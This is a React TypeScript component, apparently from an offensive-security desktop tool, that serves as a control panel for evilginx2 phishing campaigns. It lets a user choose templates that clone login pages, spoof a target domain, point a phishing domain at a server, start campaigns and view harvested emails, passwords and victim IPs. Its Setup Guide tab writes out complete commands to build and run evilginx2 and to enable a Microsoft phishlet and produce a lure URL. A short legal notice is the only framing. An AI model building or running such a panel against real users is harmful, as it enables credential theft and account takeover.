import React, { useState, useCallback, useEffect } from 'react';

interface PhishletTemplate {
  name: string;
  domain: string;
  description: string;
  author: string;
  config: string;
}

interface PhishingCampaign {
  id: string;
  name: string;
  targetDomain: string;
  phishlet: string;
  landingUrl: string;
  phishingUrl: string;
  status: 'stopped' | 'running' | 'error';
  createdAt: string;
  capturedCredentials: Array<{
    timestamp: string;
    email: string;
    password: string;
    ip: string;
  }>;
}

interface PhishCheckResult {
  available: boolean;
  path: string;
  message: string;
}

export function PhishingPanel() {
  const [tab, setTab] = useState<'templates' | 'campaigns' | 'setup'>('templates');
  const [phishletsOpen, setPhishletsOpen] = useState(true);
  const [checkResult, setCheckResult] = useState<PhishCheckResult | null>(null);
  const [checking, setChecking] = useState(false);
  const [phishlets, setPhishlets] = useState<PhishletTemplate[]>([]);
  const [campaigns, setCampaigns] = useState<PhishingCampaign[]>([]);

  // New campaign form
  const [campaignName, setCampaignName] = useState('');
  const [targetDomain, setTargetDomain] = useState('');
  const [selectedPhishlet, setSelectedPhishlet] = useState('microsoft');
  const [serverDomain, setServerDomain] = useState('');
  const [serverIP, setServerIP] = useState('');
  const [setupInstructions, setSetupInstructions] = useState('');
  const [campaignResult, setCampaignResult] = useState<{ success: boolean; config: string; instructions: string } | null>(null);

  // Credential viewer
  const [viewingCampaign, setViewingCampaign] = useState<string | null>(null);
  const [credentials, setCredentials] = useState<any[]>([]);

  const checkPhish = useCallback(async () => {
    setChecking(true);
    try {
      const result = await window.api.phishCheck();
      setCheckResult(result);
    } catch (err: any) {
      setCheckResult({ available: false, path: '', message: `Error: ${err.message}` });
    } finally {
      setChecking(false);
    }
  }, []);

  const loadPhishlets = useCallback(async () => {
    try {
      const result = await window.api.phishGetPhishlets();
      setPhishlets(result || []);
    } catch (err) {
      console.error('Failed to load phishlets:', err);
    }
  }, []);

  const loadCampaigns = useCallback(async () => {
    try {
      const result = await window.api.phishGetCampaigns();
      setCampaigns(result || []);
    } catch (err) {
      console.error('Failed to load campaigns:', err);
    }
  }, []);

  useEffect(() => {
    checkPhish();
    loadPhishlets();
    loadCampaigns();
  }, []);

  const handleCreateCampaign = useCallback(async () => {
    if (!campaignName.trim() || !targetDomain.trim()) return;

    try {
      const campaign = await window.api.phishCreateCampaign(campaignName.trim(), targetDomain.trim(), selectedPhishlet);
      if (campaign) {
        setCampaignName('');
        setTargetDomain('');
        loadCampaigns();
        window.api.addActivity({ tab: 'phish', type: 'start', label: `Campaign: ${campaignName.trim()}`, detail: `Target: ${targetDomain.trim()}, Template: ${selectedPhishlet}` });
        // Switch to campaigns tab
        setTab('campaigns');
      }
    } catch (err: any) {
      console.error('Failed to create campaign:', err);
    }
  }, [campaignName, targetDomain, selectedPhishlet]);

  const handleStartCampaign = useCallback(async (campaignId: string) => {
    if (!serverDomain.trim() || !serverIP.trim()) {
      alert('Enter your server domain and IP first');
      return;
    }
    try {
      const result = await window.api.phishStartCampaign(campaignId, serverDomain.trim(), serverIP.trim());
      setCampaignResult(result);
      setSetupInstructions(result.instructions);
      loadCampaigns();
      window.api.addActivity({ tab: 'phish', type: 'start', label: `Started Campaign ${campaignId.slice(0, 8)}`, detail: `Domain: ${serverDomain.trim()}, IP: ${serverIP.trim()}` });
    } catch (err: any) {
      alert(`Failed: ${err.message}`);
    }
  }, [serverDomain, serverIP]);

  const handleStopCampaign = useCallback(async (campaignId: string) => {
    await window.api.phishStopCampaign(campaignId);
    loadCampaigns();
    window.api.addActivity({ tab: 'phish', type: 'stop', label: 'Stopped Campaign', detail: `Campaign: ${campaignId.slice(0, 8)}` });
  }, []);

  const viewCredentials = useCallback(async (campaignId: string) => {
    setViewingCampaign(campaignId);
    try {
      const result = await window.api.phishGetCredentials(campaignId);
      setCredentials(result || []);
    } catch (err) {
      setCredentials([]);
    }
  }, []);

  const deleteCampaign = useCallback(async (campaignId: string) => {
    await window.api.phishDeleteCampaign(campaignId);
    loadCampaigns();
    if (viewingCampaign === campaignId) {
      setViewingCampaign(null);
      setCredentials([]);
    }
    window.api.addActivity({ tab: 'phish', type: 'stop', label: 'Deleted Campaign', detail: `Campaign: ${campaignId.slice(0, 8)}` });
  }, [viewingCampaign]);

  const tabs = [
    { id: 'templates' as const, label: 'Templates', icon: '📝' },
    { id: 'campaigns' as const, label: 'Campaigns', icon: '🎯' },
    { id: 'setup' as const, label: 'Setup Guide', icon: '📖' },
  ];

  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="card border-midnight-700/50">
        <div className="flex items-center gap-2 mb-2">
          <span className="text-lg">🎣</span>
          <h2 className="text-sm font-semibold text-gray-300 uppercase tracking-wider">Phishing Framework</h2>
        </div>
        <p className="text-xs text-gray-500">
          Create phishing campaigns using evilginx2-compatible templates.
          Captured credentials are logged automatically.
        </p>

        {/* Evilginx status */}
        <div className="mt-3 flex items-center gap-2">
          {checking ? (
            <span className="text-xs text-gray-500 flex items-center gap-1">
              <svg className="animate-spin h-3 w-3" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
              </svg>
              Checking availability...
            </span>
          ) : checkResult ? (
            <span className={`text-xs flex items-center gap-1.5 ${checkResult.available ? 'text-green-400' : 'text-yellow-400'}`}>
              <span className={`w-2 h-2 rounded-full ${checkResult.available ? 'bg-green-500' : 'bg-yellow-500'}`} />
              {checkResult.available ? 'Evilginx2 available' : 'Evilginx2 not detected'}
            </span>
          ) : null}
        </div>
      </div>

      {/* Tab bar */}
      <div className="flex gap-1 bg-midnight-900 rounded-lg p-1 border border-midnight-800">
        {tabs.map((t) => (
          <button
            key={t.id}
            onClick={() => setTab(t.id)}
            className={`flex-1 py-2 rounded-md text-xs font-medium transition-all ${
              tab === t.id
                ? 'bg-redhawk-600/20 text-redhawk-400 border border-redhawk-600/30'
                : 'text-gray-500 hover:text-gray-300'
            }`}
          >
            {t.icon} {t.label}
          </button>
        ))}
      </div>

      {/* ── TAB: Templates ── */}
      {tab === 'templates' && (
        <div className="space-y-3">
          {/* Create campaign form — moved to top */}
          <div className="card border-redhawk-700/30">
            <div className="card-header text-redhawk-400">New Campaign</div>
            <div className="space-y-3">
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="text-[10px] text-gray-500 block mb-1">Campaign Name</label>
                  <input
                    type="text" value={campaignName}
                    onChange={(e) => setCampaignName(e.target.value)}
                    className="input-field h-9 text-sm"
                    placeholder="e.g. Target Exec Phish"
                  />
                  <span className="text-[9px] text-gray-600 mt-0.5 block">Any name to identify this campaign</span>
                </div>
                <div>
                  <label className="text-[10px] text-gray-500 block mb-1">Target Domain</label>
                  <input
                    type="text" value={targetDomain}
                    onChange={(e) => setTargetDomain(e.target.value)}
                    className="input-field h-9 text-sm font-mono"
                    placeholder="e.g. instagram.com"
                  />
                  <span className="text-[9px] text-gray-600 mt-0.5 block">The real domain you're spoofing (from template above)</span>
                </div>
              </div>
              <div>
                <label className="text-[10px] text-gray-500 block mb-1">Phishlet Template</label>
                <select
                  value={selectedPhishlet}
                  onChange={(e) => setSelectedPhishlet(e.target.value)}
                  className="input-field h-9 text-sm"
                >
                  {phishlets.map((p, i) => (
                    <option key={i} value={p.name} className="bg-midnight-900">{p.name} ({p.domain})</option>
                  ))}
                </select>
                <span className="text-[9px] text-gray-600 mt-0.5 block">Which service's login page to clone</span>
              </div>
              <button onClick={handleCreateCampaign} disabled={!campaignName.trim() || !targetDomain.trim()} className="btn-primary w-full">
                Create Campaign
              </button>
            </div>
          </div>

          {/* Available Phishlets — collapsible tag */}
          <div className="card">
            <button
              onClick={() => setPhishletsOpen(!phishletsOpen)}
              className="w-full flex items-center justify-between cursor-pointer"
            >
              <span className="card-header mb-0">Available Phishlets ({phishlets.length})</span>
              <svg
                className={`w-4 h-4 text-gray-500 transition-transform ${phishletsOpen ? 'rotate-180' : ''}`}
                fill="none" stroke="currentColor" viewBox="0 0 24 24"
              >
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
              </svg>
            </button>
            {phishletsOpen && (
              <div className="space-y-2 mt-3">
                {phishlets.map((phishlet, idx) => (
                  <div key={idx} className="p-3 rounded-lg bg-midnight-800/30 border border-midnight-700/30">
                    <div className="flex items-center justify-between">
                      <div>
                        <span className="text-sm font-mono text-gray-200">{phishlet.name}</span>
                        <span className="text-[10px] text-gray-500 ml-2">({phishlet.domain})</span>
                      </div>
                      <span className="text-[10px] text-gray-600">{phishlet.author}</span>
                    </div>
                    <p className="text-xs text-gray-500 mt-1">{phishlet.description}</p>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* ── TAB: Campaigns ── */}
      {tab === 'campaigns' && (
        <div className="space-y-3">
          {/* Server config */}
          <div className="card">
            <div className="card-header">Your Phishing Server</div>
            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="text-[10px] text-gray-500 block mb-1">Phishing Domain</label>
                <input
                  type="text" value={serverDomain}
                  onChange={(e) => setServerDomain(e.target.value)}
                  className="input-field h-9 text-sm font-mono"
                  placeholder="e.g. secure-login.xyz"
                />
                <span className="text-[9px] text-gray-600 mt-0.5 block">The domain you own, pointed to your VPS (for the phishing page)</span>
              </div>
              <div>
                <label className="text-[10px] text-gray-500 block mb-1">VPS Public IP</label>
                <input
                  type="text" value={serverIP}
                  onChange={(e) => setServerIP(e.target.value)}
                  className="input-field h-9 text-sm font-mono"
                  placeholder="e.g. 203.0.113.42"
                />
                <span className="text-[9px] text-gray-600 mt-0.5 block">Your server's public IP where evilginx2 will run</span>
              </div>
            </div>
          </div>

          {campaigns.length === 0 ? (
            <div className="card flex flex-col items-center py-8 text-gray-600">
              <span className="text-3xl mb-2">🎣</span>
              <p className="text-sm">No campaigns yet</p>
              <p className="text-xs">Create one in the Templates tab</p>
            </div>
          ) : (
            campaigns.map((campaign) => (
              <div key={campaign.id} className="card border-midnight-700/50">
                <div className="flex items-center justify-between mb-2">
                  <div>
                    <span className="text-sm font-medium text-gray-200">{campaign.name}</span>
                    <span className={`ml-2 text-[10px] px-1.5 py-0.5 rounded-full ${
                      campaign.status === 'running' ? 'bg-green-900/30 text-green-400 border border-green-700/40' :
                      campaign.status === 'stopped' ? 'bg-gray-900/30 text-gray-400 border border-gray-700/40' :
                      'bg-red-900/30 text-red-400 border border-red-700/40'
                    }`}>{campaign.status}</span>
                  </div>
                  <div className="flex gap-1">
                    {campaign.status === 'stopped' ? (
                      <button onClick={() => handleStartCampaign(campaign.id)} className="btn-ghost text-xs">
                        ▶ Start
                      </button>
                    ) : (
                      <button onClick={() => handleStopCampaign(campaign.id)} className="btn-ghost text-xs text-redhawk-400">
                        ⏹ Stop
                      </button>
                    )}
                    <button onClick={() => viewCredentials(campaign.id)} className="btn-ghost text-xs">
                      📧 {campaign.capturedCredentials.length}
                    </button>
                    <button onClick={() => deleteCampaign(campaign.id)} className="btn-ghost text-xs text-gray-600 hover:text-redhawk-400">
                      ✕
                    </button>
                  </div>
                </div>
                <div className="grid grid-cols-2 gap-2 text-xs text-gray-500">
                  <span className="font-mono">{campaign.targetDomain}</span>
                  <span className="font-mono">{campaign.phishlet}</span>
                </div>
                <p className="text-[10px] text-gray-600 mt-1">
                  Created: {new Date(campaign.createdAt).toLocaleString()}
                </p>

                {/* Credentials viewer */}
                {viewingCampaign === campaign.id && credentials.length > 0 && (
                  <div className="mt-3 pt-2 border-t border-midnight-800">
                    <p className="text-[10px] text-gray-500 mb-1.5 uppercase tracking-wider">Captured Credentials</p>
                    <div className="max-h-40 overflow-y-auto space-y-1">
                      {credentials.map((cred, idx) => (
                        <div key={idx} className="p-2 rounded bg-midnight-800/50 border border-midnight-700/30 text-xs">
                          <div className="flex items-center gap-2">
                            <span className="text-green-400 font-mono">{cred.email}</span>
                            <span className="text-redhawk-400 font-mono">{cred.password}</span>
                          </div>
                          <p className="text-[10px] text-gray-600 mt-0.5">
                            IP: {cred.ip} | {new Date(cred.timestamp).toLocaleString()}
                          </p>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            ))
          )}

          {/* Setup instructions */}
          {setupInstructions && (
            <div className="card">
              <div className="card-header">Deployment Instructions</div>
              <pre className="terminal text-[10px] whitespace-pre-wrap max-h-96 overflow-y-auto">
                {setupInstructions}
              </pre>
              <button
                onClick={() => { navigator.clipboard.writeText(setupInstructions); }}
                className="btn-ghost text-xs mt-2"
              >
                Copy Instructions
              </button>
            </div>
          )}
        </div>
      )}

      {/* ── TAB: Setup Guide ── */}
      {tab === 'setup' && (
        <div className="card">
          <div className="card-header">Setting Up Evilginx2</div>
          <div className="prose prose-invert max-w-none text-xs text-gray-400 space-y-4">
            <div>
              <h4 className="text-gray-200 text-sm font-medium mb-2">Windows (WSL2) — Recommended</h4>
              <pre className="terminal text-[11px] whitespace-pre-wrap">{`wsl --install -d Ubuntu
wsl
sudo apt update && sudo apt install -y golang git make
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
make
sudo ./evilginx2`}</pre>
            </div>

            <div>
              <h4 className="text-gray-200 text-sm font-medium mb-2">Linux (VPS)</h4>
              <pre className="terminal text-[11px] whitespace-pre-wrap">{`apt update && apt install -y golang git make
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
make
./evilginx2 -p yourdomain.com -i YOUR_SERVER_IP`}</pre>
            </div>

            <div>
              <h4 className="text-gray-200 text-sm font-medium mb-2">Docker</h4>
              <pre className="terminal text-[11px] whitespace-pre-wrap">{`docker run -d \\
  --name evilginx \\
  -p 80:80 -p 443:443 \\
  -v $(pwd)/phishlets:/app/phishlets \\
  evilginx2/evilginx2`}</pre>
            </div>

            <div>
              <h4 className="text-gray-200 text-sm font-medium mb-2">Inside Evilginx2 Shell</h4>
              <pre className="terminal text-[11px] whitespace-pre-wrap">{`config domain yourdomain.com
config ip YOUR_SERVER_IP
phishlets hostname microsoft login.yourdomain.com
phishlets enable microsoft
lures create microsoft
lures get-url 0  ← this gives you the phishing URL`}</pre>
            </div>

            <div className="bg-yellow-900/20 border border-yellow-700/30 rounded-lg p-3">
              <p className="text-yellow-400 font-medium text-xs mb-1">⚠️ Legal Notice</p>
              <p className="text-[10px] text-gray-500">
                Phishing simulations should only be conducted with explicit written authorization.
                Unauthorized phishing is illegal in most jurisdictions.
              </p>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
